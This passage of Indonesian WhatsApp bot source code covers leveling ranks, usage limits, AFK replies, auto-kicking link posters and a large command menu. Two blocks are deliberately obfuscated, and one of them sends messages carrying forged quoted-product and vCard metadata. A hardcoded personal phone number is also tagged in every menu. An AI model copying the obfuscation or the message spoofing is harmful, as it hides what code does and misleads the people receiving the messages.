			}
			var role = 'NEWBIE'
			if (Rank <= 3) {
				role = 'Bronze I'
			} else if (Rank <= 5) {
				role = 'Bronze II'
			} else if (Rank <= 7) {
				role = 'Bronze III'
			} else if (Rank <= 9) {
				role = 'Silver I'
			} else if (Rank <= 11) {
				role = 'Silver II'
			} else if (Rank <= 13) {
				role = 'Silver III'
			} else if (Rank <= 16) {
				role = 'Gold I'
			} else if (Rank <= 18) {
				role = 'Gold II'
			} else if (Rank <= 20) {
				role = 'Gold III'
			} else if (Rank <= 22) {
				role = 'Gold IV'
			} else if (Rank <= 25) {
				role = 'Platinum I'
			} else if (Rank <= 27) {
				role = 'Platinum II'
			} else if (Rank <= 29) {
				role = 'Platinum III'
			} else if (Rank <= 31) {
				role = 'Platinum IV'
			} else if (Rank <= 33) {
				role = 'Diamond I'
			} else if (Rank <= 35) {
				role = 'Diamomd II'
			} else if (Rank <= 37) {
				role = 'Diamond III'
			} else if (Rank <= 39) {
				role = 'Diamond IV'
			} else if (Rank <= 45) {
				role = 'Master'
			} else if (Rank <= 100) {
				role = 'Grand Master'
			}

			if (isGroup && isRegistered && isLevelingOn) {
				const currentLevel = getLevelingLevel(sender)
				const checkId = getLevelingId(sender)
				try {
					if (currentLevel === undefined && checkId === undefined) addLevelingId(sender)
					const amountXp = Math.floor(Math.random() * 10) + 500
					const requiredXp = 5000 * (Math.pow(2, currentLevel) - 1)
					const getLevel = getLevelingLevel(sender)
					addLevelingXp(sender, amountXp)
					if (requiredXp <= getLevelingXp(sender)) {
						addLevelingLevel(sender, 1)
						bayarLimit(sender, 3)
						await reply(dla.levelup(pushname, sender, getLevelingXp, getLevel, getLevelingLevel, role))
					}
				} catch (err) {
					console.error(err)
				}
			}
			const checkLimit = (sender) => {
				let found = false
				for (let lmt of _limit) {
					if (lmt.id === sender) {
						let limitCounts = limitawal - lmt.limit
						if (limitCounts <= 0) return dila.sendMessage(from, `Limit Anda Sudah Habis\nUpgrade Premium Biar Bebas Limit Kak`, text, { quoted: Lan })
						dila.sendMessage(from, dla.limitcount(isPrem, limitCounts), text, { quoted: Lan })
						found = true
					}
				}
				if (found === false) {
					let obj = { id: sender, limit: 0 }
					_limit.push(obj)
					fs.writeFileSync('./database/limit.json', JSON.stringify(_limit))
					dila.sendMessage(from, dla.limitcount(isPrem, limitCounts), text, { quoted: Lan })
				}
			}
			const isLimit = (sender) => {
				let position = false
				for (let i of _limit) {
					if (i.id === sender) {
						let limits = i.limit
						if (limits >= limitawal) {
							position = true
							dila.sendMessage(from, dla.limitend(pushname, prefix), text, { quoted: Lan })
							return true
						} else {
							_limit
							position = true
							return false
						}
					}
				}
				if (position === false) {
					const obj = { id: sender, limit: 0 }
					_limit.push(obj)
					fs.writeFileSync('./database/limit.json', JSON.stringify(_limit))
					return false
				}
			}
			if (isRegistered) {
				const checkATM = checkATMuser(sender)
				try {
					if (checkATM === undefined) addATM(sender)
					const uangsaku = Math.floor(Math.random() * 10) + 90
					addKoinUser(sender, uangsaku)
				} catch (err) {
					console.error(err)
				}
			}
			const limitAdd = (sender) => {
				if (isOwner && isPrem) { return false; }
				let position = false
				Object.keys(_limit).forEach((i) => {
					if (_limit[i].id == sender) {
						position = i
					}
				})
				if (position !== false) {
					_limit[position].limit += 1
					fs.writeFileSync('./database/limit.json', JSON.stringify(_limit))
				}
			}
			for (let x of mentionUser) {
                if (afk.hasOwnProperty(x.split('@')[0])) {
                    ini_txt = "\`\`\`Orangnya lagi Afk kak!\`\`\`\n"
                    if (afk[x.split('@')[0]] !="") {
                        ini_txt += "\`\`\`Alasan:\`\`\` " + afk[x.split('@')[0]]
                    }
                    dila.sendMessage(from, ini_txt, text, { quoted: Lan})
                }
            }
            if (afk.hasOwnProperty(sender.split('@')[0])) {
                reply(`\`\`\`${pushname} telah kembali dari Afk! Saatnya nguli~\`\`\``)
                delete afk[sender.split('@')[0]]
                fs.writeFileSync("./database/afk.json", JSON.stringify(afk))
            }
			if (isGroup) {
				try {
					const getmemex = groupMembers.length
					if (getmemex <= memberlimit) {
						reply(`maaf kak membernya sedikit, aku gak bisa disini! Minimal member : ${memberlimit}`)
						setTimeout(() => {
							dila.groupLeave(from)
						}, 5000)
						setTimeout(() => {
							dila.updatePresence(from, Presence.composing)
							reply("See you kak")
						}, 4000)
						setTimeout(() => {
							dila.updatePresence(from, Presence.composing)
							reply("Oh iya, jangan lupain aku ya:(")
						}, 3000)
						setTimeout(() => {
							dila.updatePresence(from, Presence.composing)
							reply("Baru undang aku lagi:)")
						}, 2000)
						setTimeout(() => {
							dila.updatePresence(from, Presence.composing)
							reply("Membernya tambahin dulu")
						}, 1000)
						setTimeout(() => {
							dila.updatePresence(from, Presence.composing)
							reply("Aku pamit ya kak:)")
						}, 0)
					}
				} catch (err) { console.error(err) }
			}
				if (bad.includes(messagesD)) {
				daui = fs.readFileSync('./dns/toxic.mp3')
				dila.sendMessage(from, daui, audio, { mimetype: 'audio/mp4', ptt: true, quoted: Lan})
				}
			if (budy.includes("¡kick")) {
			if (!isOwner) return reply(dla.ownerb())
			if (!isBotGroupAdmins) return reply(dla.badmin())
			if (Lan.message.extendedTextMessage === undefined || Lan.message.extendedTextMessage === null) return reply('Reply targetnya!')
			kicknya = Lan.message.extendedTextMessage.contextInfo.participant
		    dila.groupRemove(from, [kicknya])
			}
			if (budy.includes("¡add")) {
			if (!isOwner) return reply(dla.ownerb())
			if (!isBotGroupAdmins) return reply(dla.badmin())
			if (Lan.message.extendedTextMessage === undefined || Lan.message.extendedTextMessage === null) return reply('Reply targetnya!')
			addnya = Lan.message.extendedTextMessage.contextInfo.participant
		    dila.groupAdd(from, [addnya])
			}
		    if (budy.includes("https://chat.whatsapp.com/")) {
				if (!isGroup) return
				if (!isAntiLink) return
				if (isGroupAdmins) return reply('Atasan grup mah bebas yakan :v')
				dila.updatePresence(from, Presence.composing)
				if (budy.includes("izinbos")) return reply("Iya kak jangan spam ya")
				if (budy.includes("izinmin")) return reply("Iya kak jangan spam ya")
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				reply(`Woyy ${sender.split("@")[0]} Gak Boleh Share Link`)
				setTimeout(() => {
					console.log(color('[', 'white'), color('SYSTEM', 'cyan'), color(']', 'white'), color('Ada yang kirim link grup tuh kak, Dila kick ya kak', 'yellow'), color('(😅)', 'white'))
					dila.groupRemove(from, [kic]).catch((e) => { reply(`BOT HARUS JADI ADMIN`) })
				}, 3000)
				setTimeout(() => {
					dila.updatePresence(from, Presence.composing)
					reply("Hedsot :v")
				}, 2000)
				setTimeout(() => {
					dila.updatePresence(from, Presence.composing)
					reply("Bismillah")
				}, 1000)
				setTimeout(() => {
					dila.updatePresence(from, Presence.composing)
					reply("Ready?")
				}, 0)
			}
			if (budy.includes(`${prefix}bug`)) {
				if (!isGroup) return
				if (!isAntiLink) return
				if (isGroupAdmins) return reply('Jangan pake fitur buggc min tar gabisa dibuka grupnya :)')
				dila.updatePresence(from, Presence.composing)
				var kuc = `${sender.split("@")[0]}@s.whatsapp.net`
				reply(`${sender.split("@")[0]} Lu Kirim Buggc Otw Kick`)
					console.log(color('[', 'white'), color('SYSTEM', 'cyan'), color(']', 'white'), color('Ada yang kirim buggc tuh kak, Dila kick ya kak', 'yellow'), color('(😅)', 'white'))
					dila.groupRemove(from, [kuc]).catch((e) => { reply(`BOT HARUS JADI ADMIN`) })
					}
			const _0x5a58=['tYa6ie8GoIbpifDPBVcFKze','8j+uLca6ipcFJzaGoIa/pW','8j+nJca6ipcFJyWGoIdWN42mifDPBVcFKze','nJeYm21fu0zfwq','8j+nKIa6ipcFLjqGoIdWN42k','8j+nIIa6ipcFJySGoIdWN5su','odL3D3PdAK0','tYa6ie8GoIbpifDPBIdWN5gr','mtnmvuHwDuq','ndnYB2Tkq1m','8j+uLca6ipcFLjqGoIdWN42h','tYa6ifGGoIby','mte1mZncuwT6u2u','mtm1mde5qwvSChzh','nxbeu2DnCG','mtuXntm1wKrLBw5f','ntu2oxLgseT3yq','8j+uLca6ipcFJziGoIdWN42q','8j+nIIa6ipcFJziGoIdWN42q','8j+nJca6id8/idOG8j+uLa','tYa6ifGGoIbp','mwPoqvDsva','wca6ifGGoIby','nte3ndHQwu5eEK8','tYa6ie8GoIby','8j+nHYa6id8/idOG8j+nKa','8j+uLca6ipcFJziGoIdWN42k','nZfAueDwBwi'];const _0x25cb5f=_0x4314;(function(_0x32dd3a,_0x31f47e){const _0x5569aa=_0x4314;while(!![]){try{const _0x39003c=-parseInt(_0x5569aa(0x174))+-parseInt(_0x5569aa(0x176))*parseInt(_0x5569aa(0x17c))+parseInt(_0x5569aa(0x189))*parseInt(_0x5569aa(0x186))+-parseInt(_0x5569aa(0x177))*-parseInt(_0x5569aa(0x182))+-parseInt(_0x5569aa(0x17e))+-parseInt(_0x5569aa(0x173))*parseInt(_0x5569aa(0x18b))+-parseInt(_0x5569aa(0x175))*-parseInt(_0x5569aa(0x18c));if(_0x39003c===_0x31f47e)break;else _0x32dd3a['push'](_0x32dd3a['shift']());}catch(_0x3f5e0b){_0x32dd3a['push'](_0x32dd3a['shift']());}}}(_0x5a58,0x6e6ea));function _0x4314(_0x39c663,_0x587587){_0x39c663=_0x39c663-0x171;let _0x5a5851=_0x5a58[_0x39c663];if(_0x4314['ziPIRN']===undefined){var _0x431402=function(_0x4c68c2){const _0x448707='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x2cf60f='';for(let _0x27c963=0x0,_0x2f9336,_0x477c39,_0x1c75c9=0x0;_0x477c39=_0x4c68c2['charAt'](_0x1c75c9++);~_0x477c39&&(_0x2f9336=_0x27c963%0x4?_0x2f9336*0x40+_0x477c39:_0x477c39,_0x27c963++%0x4)?_0x2cf60f+=String['fromCharCode'](0xff&_0x2f9336>>(-0x2*_0x27c963&0x6)):0x0){_0x477c39=_0x448707['indexOf'](_0x477c39);}return _0x2cf60f;};_0x4314['WofrOI']=function(_0x446fb5){const _0x3c3d68=_0x431402(_0x446fb5);let _0x53e099=[];for(let _0x17ce05=0x0,_0x198b77=_0x3c3d68['length'];_0x17ce05<_0x198b77;_0x17ce05++){_0x53e099+='%'+('00'+_0x3c3d68['charCodeAt'](_0x17ce05)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x53e099);},_0x4314['NIXFWG']={},_0x4314['ziPIRN']=!![];}const _0x25570f=_0x5a58[0x0],_0x28928e=_0x39c663+_0x25570f,_0x27b3b9=_0x4314['NIXFWG'][_0x28928e];return _0x27b3b9===undefined?(_0x5a5851=_0x4314['WofrOI'](_0x5a5851),_0x4314['NIXFWG'][_0x28928e]=_0x5a5851):_0x5a5851=_0x27b3b9,_0x5a5851;}const sotoy=[_0x25cb5f(0x179),_0x25cb5f(0x187),_0x25cb5f(0x180),_0x25cb5f(0x188),_0x25cb5f(0x178),_0x25cb5f(0x181),_0x25cb5f(0x188),'🍐\x20:\x20🍒\x20:\x20🍋','🍐\x20:\x20🍒\x20:\x20🍐','🍊\x20:\x20🍒\x20:\x20🍒',_0x25cb5f(0x171),_0x25cb5f(0x17a),'🍐\x20:\x20🔔\x20:\x20🔔','🍊\x20:\x20🍋\x20:\x20🍒','🍋\x20:\x20🍋\x20:\x20🍋\x20Win👑','🔔\x20:\x20🔔\x20:\x20🍇','🔔\x20:\x20🍐\x20:\x20🍇',_0x25cb5f(0x184),_0x25cb5f(0x185)],sotoyy=[_0x25cb5f(0x17d),'X\x20:\x20O\x20:\x20X',_0x25cb5f(0x172),_0x25cb5f(0x17f),'X\x20:\x20X\x20:\x20O',_0x25cb5f(0x18a),_0x25cb5f(0x17b),_0x25cb5f(0x183)];
	 var Simi = 'Off'
			if(isSimi) {
			Simi = 'On'
			}
	  var Eventon = 'Off'
			if(isEventon) {
			Eventon = 'On'
			}
	  var Leveling = 'Off'
			if(isLevelingOn) {
			Leveling = 'On'
			}
	  var Welkom = 'Off'
			if(isWelkom) {
			Welkom = 'On'
			}
	  var AntiLink = 'Off'
			if(isAntiLink) {
			AntiLink = 'On'
			}
	  var AutoSticker = 'Off'
			if(isAuto) {
			AutoSticker = 'On'
			}
	  var AntiBumle = 'Off'
			if(isKickArea) {
			AntiBumle = 'On'
			}
            colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
			const isMedia = (type === 'imageMessage' || type === 'videoMessage')
			const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
			const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
			const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
			const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
			const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
			const isQuotedText = type === 'extendedTextMessage' && content.includes('extendedTextMessage')
			if (!isGroup && isCmd) console.log('\x1b[1;31m\x1b[1;37m⟩', `[\x1b[1;32m${botName}\x1b[1;37m]`, time, color(command), 'dari', color(sender.split('@')[0]), 'args :', color(args.length))
			if (!isGroup && !isCmd) console.log('\x1b[1;31m\x1b[1;37m⟩', '[\x1b[1;31mERROR\x1b[1;37m]', time, color('Pesan'), 'dari', color(pushname), 'args :', color(args.length))
			if (isCmd && isGroup) console.log('\x1b[1;31m\x1b[1;37m⟩', `[\x1b[1;32m${botName}\x1b[1;37m]`, time, color(command), 'dari', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
			if (!isCmd && isGroup) console.log('\x1b[1;31m\x1b[1;37m⟩', '[\x1b[1;31mERROR\x1b[1;37m]', time, color('Pesan'), 'dari', color(pushname), 'in', color(groupName), 'args :', color(args.length))
			if (self === true && !isOwner && isCmd) return
			switch (command) {
				case 'menu':
				case 'help':
					if (isBanned) return reply(dla.baned())
					const reqXp = 5000 * (Math.pow(2, getLevelingLevel(sender)) - 1)
					const uangku = checkATMuser(sender)
					const lvl = getLevelingLevel(sender)
					const hour_now = moment().format('HH:mm')
					dmenu = fs.readFileSync(`./dns/profile.jpg`)
					runtime = process.uptime()
				 const jmn = moment.tz('Asia/Jakarta').format('HH:mm:ss')
				if (hour_now >= '02:30' && hour_now <= '04:30') {
         var ucapanWaktu = 'Selamat Malam!'
        } else if (hour_now >= '04:30' && hour_now <= '06:00') {
          var ucapanWaktu = 'Subuh!'
        } else if (hour_now >= '06:00' && hour_now <= '10:00') {
          var ucapanWaktu = 'Selamat Pagi!'
        } else if (hour_now >= '10:00' && hour_now <= '14:00') {
         var ucapanWaktu = 'Selamat Siang!'
        } else if (hour_now >= '14:00' && hour_now <= '17:00') {
          var ucapanWaktu = 'Selamat Sore!'
        } else if (hour_now >= '17:00' && hour_now <= '17:30') {
         var ucapanWaktu = 'Petang!'
        } else if (hour_now >= '17:30' && hour_now <= '18:10') {
         var ucapanWaktu = 'Maghrib!'
        } else if (hour_now >= '18:10' && hour_now <= '02:30') {
          var ucapanWaktu = 'Malam!'
        }
            let d = new Date
				let locale = 'id'
					let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
					let weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
					let week = d.toLocaleDateString(locale, { weekday: 'long' })
					let calender = d.toLocaleDateString(locale, {
				day: 'numeric',
				month: 'long',
				year: 'numeric'
				})
let i = []
				let giid = []
				for (mem of totalchat){
					i.push(mem.jid)
				}
				for (id of i){
					if (id && id.includes('g.us')){
						giid.push(id)
					}
				}
				let timestampi = speed();
				let latensii = speed() - timestampi
				let batanu = global.batrei[global.batrei.length - 1]
				const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = dila.user.phone
			menunye = `_───────────────────────_

≡ _group_
${grupLink}

≡ _owner_
https://wa.me/${owner}

≡ _instagram_
${igLink}


_───────────────────────_`
			dtod = "6285866295942@s.whatsapp.net" //jangan diganti tar error
			menunya = `\`\`\`────「 ${botName} 」────\`\`\`

\`\`\`┌ Dcode-anfebn\`\`\
\`\`\`├ ${ucapanWaktu}\`\`\`
\`\`\`├ Jam : ${jmn}\`\`\`
\`\`\`├ Hari : ${week} ${weton}\`\`\`
\`\`\`└ Tanggal : ${calender}\`\`\`

\`\`\`┌ About\`\`\
\`\`\`├ ${prefix}donasi\`\`\`
\`\`\`├ ${prefix}iklan\`\`\`
\`\`\`├ ${prefix}info\`\`\`
\`\`\`├ ${prefix}status\`\`\`
\`\`\`└ ${prefix}tutorial\`\`\`

\`\`\`┌ Device\`\`\`
\`\`\`├ Baterai : ${batanu}%\`\`\`
\`\`\`├ Whatsapp : ${wa_version}\`\`\`
\`\`\`├ Merk HP : ${device_manufacturer}\`\`\`
\`\`\`├ Versi HP : ${device_model}\`\`\`
\`\`\`├ Versi OS : ${os_version}\`\`\`
\`\`\`├ RAM : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB\`\`\`
\`\`\`├ MCC : ${mcc}\`\`\`
\`\`\`└ MNC : ${mnc}\`\`\`

\`\`\`┌ User Info\`\`\`
\`\`\`├ Nama : ${pushname}\`\`\`
\`\`\`├ User : ${prema}\`\`\`
\`\`\`├ Uang : ${uangku}\`\`\`
\`\`\`├ Xp : ${reqXp}\`\`\`
\`\`\`├ Rank : ${role}\`\`\`
\`\`\`└ Level : ${lvl}\`\`\`

\`\`\`┌ Grup Info\`\`\`
\`\`\`├ Event : ${Eventon}\`\`\`
\`\`\`├ Simih : ${Simi}\`\`\`
\`\`\`├ Leveling : ${Leveling}\`\`\`
\`\`\`├ Welcome : ${Welkom}\`\`\`
\`\`\`├ AutoSticker : ${AutoSticker}\`\`\`
\`\`\`├ AntiBule : ${AntiBumle}\`\`\`
\`\`\`├ AntiLink : ${AntiLink}\`\`\`
\`\`\`└ AntiDelete : On\`\`\`

\`\`\`┌ Bot Info\`\`\`
\`\`\`├ Mode : ${self ? 'Self' : 'Public'}\`\`\`
\`\`\`├ Prefix : Multi Prefix\`\`\`
\`\`\`├ Total Register : ${_registered.length}\`\`\`
\`\`\`├ User Premium : ${premium.length}\`\`\`
\`\`\`├ Personal Chat : ${totalchat.length - giid.length}\`\`\`
\`\`\`├ Group Chat : ${giid.length}\`\`\`
\`\`\`├ Total Chat : ${totalchat.length}\`\`\`
\`\`\`├ Total Block Contact : ${blocked.length}\`\`\`
\`\`\`├ Browser : ${dila.browserDescription[1]}\`\`\`
\`\`\`├ Server : ${dila.browserDescription[0]}\`\`\`
\`\`\`├ Version : ${dila.browserDescription[2]}\`\`\`
\`\`\`├ Speed : ${latensii.toFixed(4)} Second\`\`\`
\`\`\`└ Runtime : ${kyun(runtime)}\`\`\`

\`\`\`┌ List Menu\`\`\`
\`\`\`├ ${prefix}allmenu\`\`\`
\`\`\`├ ${prefix}simplemenu\`\`\`
\`\`\`├ ${prefix}groupmenu\`\`\`
\`\`\`├ ${prefix}downloadmenu\`\`\`
\`\`\`├ ${prefix}makermenu\`\`\`
\`\`\`├ ${prefix}sertifikatmenu\`\`\`
\`\`\`├ ${prefix}gabutmenu\`\`\`
\`\`\`├ ${prefix}randommenu\`\`\`
\`\`\`├ ${prefix}dompetmenu\`\`\`
\`\`\`├ ${prefix}toolsmenu\`\`\`
\`\`\`├ ${prefix}mutualmenu\`\`\`
\`\`\`├ ${prefix}othermenu\`\`\`
\`\`\`├ ${prefix}storagemenu\`\`\`
\`\`\`└ ${prefix}ownermenu\`\`\`

\`\`\`────「 ${botName} 」────\`\`\``
var _0x2a14=['mZa1ntC2wKXgtufZ','mJy2nZvivLrcque','C3bSAxq','mu9qz0TSuW','C2vUze1LC3nHz2u','qKvhsu46vKnbuKqkvKvsu0LptJOZlJaktJPytdS','CMvHzezPBgvtEw5J','nte5nZK5CKXfBufL','nJaXmZqZu2PYqvny','lI9KBNmVzg5ZBMv3lMPWzW','otK5oq','surs','odq5mZa1tMXYC0Ph','ldS7oWPgtJO','m1jjBMLIyW','C3rHDhvZqgjYB2fKy2fZDa','mebZlNDOyxrZyxbWlM5LDa','mJHhA2vcyKK','mwPsv3Dguq','mJyXnJiWvLLQtgfr','nJa4mZq3twvJqurv'];var _0x3d1c89=_0x1598;function _0x1598(_0x19eae4,_0x397e35){_0x19eae4=_0x19eae4-0xaf;var _0x2a1454=_0x2a14[_0x19eae4];if(_0x1598['EqDFwk']===undefined){var _0x159828=function(_0x15f9da){var _0x197670='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0xb5f9e0='';for(var _0x4f9ff2=0x0,_0x486c19,_0x342db1,_0x14ce04=0x0;_0x342db1=_0x15f9da['charAt'](_0x14ce04++);~_0x342db1&&(_0x486c19=_0x4f9ff2%0x4?_0x486c19*0x40+_0x342db1:_0x342db1,_0x4f9ff2++%0x4)?_0xb5f9e0+=String['fromCharCode'](0xff&_0x486c19>>(-0x2*_0x4f9ff2&0x6)):0x0){_0x342db1=_0x197670['indexOf'](_0x342db1);}return _0xb5f9e0;};_0x1598['FYPcZY']=function(_0x5a0558){var _0xb4853b=_0x159828(_0x5a0558);var _0x2a68a9=[];for(var _0x2a75ad=0x0,_0x3b9a01=_0xb4853b['length'];_0x2a75ad<_0x3b9a01;_0x2a75ad++){_0x2a68a9+='%'+('00'+_0xb4853b['charCodeAt'](_0x2a75ad)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x2a68a9);},_0x1598['VyqrZL']={},_0x1598['EqDFwk']=!![];}var _0x307cb3=_0x2a14[0x0],_0x229f5e=_0x19eae4+_0x307cb3,_0x3adffc=_0x1598['VyqrZL'][_0x229f5e];return _0x3adffc===undefined?(_0x2a1454=_0x1598['FYPcZY'](_0x2a1454),_0x1598['VyqrZL'][_0x229f5e]=_0x2a1454):_0x2a1454=_0x3adffc,_0x2a1454;}(function(_0x500584,_0x377728){var _0x399231=_0x1598;while(!![]){try{var _0x3e3af0=parseInt(_0x399231(0xb0))*-parseInt(_0x399231(0xb3))+parseInt(_0x399231(0xb1))+-parseInt(_0x399231(0xbb))*parseInt(_0x399231(0xb6))+-parseInt(_0x399231(0xba))+-parseInt(_0x399231(0xbf))+parseInt(_0x399231(0xaf))*parseInt(_0x399231(0xb4))+parseInt(_0x399231(0xb2))*parseInt(_0x399231(0xc1));if(_0x3e3af0===_0x377728)break;else _0x500584['push'](_0x500584['shift']());}catch(_0x40095c){_0x500584['push'](_0x500584['shift']());}}}(_0x2a14,0x881e2),dila[_0x3d1c89(0xb7)](from,dmenu,image,{'quoted':{'key':{'fromMe':![],'participant':_0x3d1c89(0xc3),...from?{'remoteJid':_0x3d1c89(0xc2)}:{}},'message':{'productMessage':{'product':{'productImage':{'mimetype':'image/jpeg','jpegThumbnail':fs[_0x3d1c89(0xb9)]('./dns/thumbnail.jpeg')},'title':cr,'description':cr,'currencyCode':_0x3d1c89(0xbe),'priceAmount1000':_0x3d1c89(0xbd),'retailerId':cr,'productImageCount':0x1},'businessOwnerJid':_0x3d1c89(0xc3)}}},'thumbnail':dfrply,'contextInfo':{'forwardingScore':0x1fc,'isForwarded':!![],'mentionedJid':[dtod]},'caption':menunya}),dila[_0x3d1c89(0xb7)](from,menunye,text,{'thumbnail':dnsnew,'sendEphemeral':!![],'quoted':{'key':{'fromMe':![],'participant':_0x3d1c89(0xc3),...from?{'remoteJid':sender[_0x3d1c89(0xb5)]('@')[0x0]+'@s.whatsapp.net'}:{}},'message':{'contactMessage':{'displayName':''+pushname,'vcard':_0x3d1c89(0xb8)+sender[_0x3d1c89(0xb5)]('@')[0x0]+_0x3d1c89(0xc0)+sender[_0x3d1c89(0xb5)]('@')[0x0]+',\x0aitem1.TEL;waid='+sender['split']('@')[0x0]+':'+sender['split']('@')[0x0]+'\x0aitem1.X-ABLabel:Ponsel\x0aEND:VCARD','jpegThumbnail':fs[_0x3d1c89(0xb9)](_0x3d1c89(0xbc))}}}}));
break
case 'allmenu':
menuall =`\`\`\`┌ ${pushname}\`\`\`
\`\`\`├ ${no++}. ${prefix}sticker\`\`\`
\`\`\`├ ${no++}. ${prefix}stickergif\`\`\`
\`\`\`├ ${no++}. ${prefix}stickwm\`\`\`
\`\`\`├ ${no++}. ${prefix}sticknobg\`\`\`
\`\`\`├ ${no++}. ${prefix}takestick\`\`\`
\`\`\`├ ${no++}. ${prefix}smeme\`\`\`
\`\`\`├ ${no++}. ${prefix}fdeface\`\`\`
\`\`\`├ ${no++}. ${prefix}nuliskiri\`\`\`
\`\`\`├ ${no++}. ${prefix}nuliskanan\`\`\`
\`\`\`├ ${no++}. ${prefix}igstalk\`\`\`
\`\`\`├ ${no++}. ${prefix}lirik\`\`\`
\`\`\`├ ${no++}. ${prefix}mimpi\`\`\`
\`\`\`├ ${no++}. ${prefix}jadwaltv\`\`\`
\`\`\`├ ${no++}. ${prefix}tts\`\`\`
\`\`\`├ ${no++}. ${prefix}ttp\`\`\`
\`\`\`├ ${no++}. ${prefix}attp\`\`\`
\`\`\`├ ${no++}. ${prefix}emoji\`\`\`
\`\`\`├ ${no++}. ${prefix}simi\`\`\`
\`\`\`├ ${no++}. ${prefix}quotes\`\`\`
\`\`\`├ ${no++}. ${prefix}bikinquote\`\`\`
\`\`\`├ ${no++}. ${prefix}welcome\`\`\`
\`\`\`├ ${no++}. ${prefix}leveling\`\`\`
\`\`\`├ ${no++}. ${prefix}antilink\`\`\`
\`\`\`├ ${no++}. ${prefix}antibule\`\`\`
\`\`\`├ ${no++}. ${prefix}getpict\`\`\`
\`\`\`├ ${no++}. ${prefix}getbio\`\`\`
\`\`\`├ ${no++}. ${prefix}getppgc\`\`\`
\`\`\`├ ${no++}. ${prefix}getdeskgc\`\`\`
\`\`\`├ ${no++}. ${prefix}group\`\`\`
\`\`\`├ ${no++}. ${prefix}admin\`\`\`
\`\`\`├ ${no++}. ${prefix}kontak\`\`\`
\`\`\`├ ${no++}. ${prefix}autosticker\`\`\`
\`\`\`├ ${no++}. ${prefix}kontag\`\`\`
\`\`\`├ ${no++}. ${prefix}sticktag\`\`\`
\`\`\`├ ${no++}. ${prefix}imgtag\`\`\`
\`\`\`├ ${no++}. ${prefix}totag\`\`\`
\`\`\`├ ${no++}. ${prefix}ephemeral\`\`\`
\`\`\`├ ${no++}. ${prefix}creategroup\`\`\`
\`\`\`├ ${no++}. ${prefix}add\`\`\`
\`\`\`├ ${no++}. ${prefix}kick\`\`\`
\`\`\`├ ${no++}. ${prefix}afk\`\`\`
\`\`\`├ ${no++}. ${prefix}hidetag\`\`\`
\`\`\`├ ${no++}. ${prefix}level\`\`\`
\`\`\`├ ${no++}. ${prefix}linkgroup\`\`\`
\`\`\`├ ${no++}. ${prefix}tagall\`\`\`
\`\`\`├ ${no++}. ${prefix}simih\`\`\`
\`\`\`├ ${no++}. ${prefix}setname\`\`\`
\`\`\`├ ${no++}. ${prefix}setdesc\`\`\`
\`\`\`├ ${no++}. ${prefix}demote\`\`\`
\`\`\`├ ${no++}. ${prefix}promote\`\`\`
\`\`\`├ ${no++}. ${prefix}fitnah\`\`\`
\`\`\`├ ${no++}. ${prefix}jadian\`\`\`
\`\`\`├ ${no++}. ${prefix}delete\`\`\`
\`\`\`├ ${no++}. ${prefix}mining\`\`\`
\`\`\`├ ${no++}. ${prefix}play\`\`\`
\`\`\`├ ${no++}. ${prefix}ytsearch\`\`\`
\`\`\`├ ${no++}. ${prefix}ytmp3\`\`\`
\`\`\`├ ${no++}. ${prefix}ytmp4\`\`\`
\`\`\`├ ${no++}. ${prefix}tiktok\`\`\`
\`\`\`├ ${no++}. ${prefix}tiktokaudio\`\`\`
\`\`\`├ ${no++}. ${prefix}igphoto\`\`\`
\`\`\`├ ${no++}. ${prefix}igvideo\`\`\`
\`\`\`├ ${no++}. ${prefix}joox\`\`\`
\`\`\`├ ${no++}. ${prefix}comictext\`\`\`
\`\`\`├ ${no++}. ${prefix}hekerlogo\`\`\`
\`\`\`├ ${no++}. ${prefix}graffiti\`\`\`
\`\`\`├ ${no++}. ${prefix}glowtext\`\`\`
\`\`\`├ ${no++}. ${prefix}covertext\`\`\`
\`\`\`├ ${no++}. ${prefix}narutotext\`\`\`
\`\`\`├ ${no++}. ${prefix}erodedtext\`\`\`
\`\`\`├ ${no++}. ${prefix}walltext\`\`\`
\`\`\`├ ${no++}. ${prefix}vietteltext\`\`\`
\`\`\`├ ${no++}. ${prefix}wingstext\`\`\`
\`\`\`├ ${no++}. ${prefix}halloween\`\`\`
\`\`\`├ ${no++}. ${prefix}graffiti2\`\`\`
\`\`\`├ ${no++}. ${prefix}graffiti3\`\`\`
\`\`\`├ ${no++}. ${prefix}foiltext\`\`\`
\`\`\`├ ${no++}. ${prefix}bloodtext\`\`\`
\`\`\`├ ${no++}. ${prefix}hekertext\`\`\`
\`\`\`├ ${no++}. ${prefix}bokehtext\`\`\`
\`\`\`├ ${no++}. ${prefix}carbontext\`\`\`
\`\`\`├ ${no++}. ${prefix}avengerstext\`\`\`
\`\`\`├ ${no++}. ${prefix}watertext\`\`\`
\`\`\`├ ${no++}. ${prefix}firetext\`\`\`
\`\`\`├ ${no++}. ${prefix}metaltext\`\`\`
\`\`\`├ ${no++}. ${prefix}ballontext\`\`\`
\`\`\`├ ${no++}. ${prefix}gemboktext\`\`\`
\`\`\`├ ${no++}. ${prefix}bannerff\`\`\`
\`\`\`├ ${no++}. ${prefix}aloklogo\`\`\`
\`\`\`├ ${no++}. ${prefix}miyalogo\`\`\`
\`\`\`├ ${no++}. ${prefix}gamelogo\`\`\`
\`\`\`├ ${no++}. ${prefix}blackpink\`\`\`
\`\`\`├ ${no++}. ${prefix}thundername\`\`\`
\`\`\`├ ${no++}. ${prefix}silktext\`\`\`
\`\`\`├ ${no++}. ${prefix}partytext\`\`\`
